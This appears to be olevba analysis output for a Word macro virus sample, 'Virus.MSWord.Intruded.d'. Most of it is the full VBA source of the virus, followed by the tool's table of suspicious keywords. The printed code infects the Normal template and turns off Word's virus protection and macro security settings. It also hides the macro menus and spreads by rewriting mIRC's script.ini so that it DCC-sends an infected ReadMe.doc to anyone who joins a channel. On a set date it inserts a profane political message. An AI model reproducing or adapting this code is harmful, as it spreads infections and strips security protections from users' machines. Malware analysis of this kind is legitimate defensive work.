olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intruded.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intruded.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EDSA4.bas 
in file: Virus.MSWord.Intruded.d - OLE stream: 'Macros/VBA/EDSA4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next

Call infest
With Dialogs(wdDialogFileSummaryInfo)
.Author = "pickpacket"
.Keywords = ""
.Execute
End With
Exists = Dir("c:\mirc\mirc32.exe")
If Exists = "" Then
Exit Sub
Else
dropped = Dir("c:\mirc\download\ReadMe.doc")
If dropped = "" Then ActiveDocument.SaveAs "c:\mirc\download\ReadMe.doc"
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\ReadMe.doc }"
Print #1, "n1=on 1:CONNECT: {"
Print #1, "n2= /clear"
Print #1, "n3= /motd"
Print #1, "n4= }"
Close #1
End If

End Sub


Sub filePrint()
On Error Resume Next

If Day(Now) = 26 And Month(Now) = 10 Then
Selection.InsertAfter "With the new government rises the ash of the former administrations" & vbCr & "Fuck the Philippine government what we want is EDSA4!!"
Selection.InsertAfter vbCr & "by pickpacket"
End If
Dialogs(wdDialogFilePrint).Show

End Sub

Sub AutoClose()
On Error Resume Next

Call infest

End Sub

Sub FileSave()
On Error Resume Next

Dialogs(wdDialogFileSave).Show
Call infest

End Sub

Sub infest()
On Error Resume Next

Call stealth
Set normtemp = NormalTemplate.VBProject.VBComponents
Set actvdoc = ActiveDocument.VBProject.VBComponents
Application.VBE.ActiveVBProject.VBComponents("EDSA4").export "c:\ppacket.vxd"
If normtemp.Item("EDSA4").Name <> "EDSA4" Then
normtemp.Remove normtemp(2)
normtemp.import "c:\ppacket.vxd"
NormalTemplate.Save
ElseIf actvdoc.Item("EDSA4").Name <> "EDSA4" Then
actvdoc.Remove actvdoc(2)
actvdoc.import "c:\ppacket.vxd"
End If
Kill "c:\ppacket.vxd"
End Sub

Sub stealth()
On Error Resume Next

CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Tools").Controls("Customize...").Delete
CommandBars("Format").Controls("Style...").Delete
CommandBars("View").Controls("Toolbars").Delete
With Options
.ConfirmConversions = False
.SaveNormalPrompt = False
.VirusProtection = False
End With
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 CommandBars("Macro").Controls("Security...").Enabled = False

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

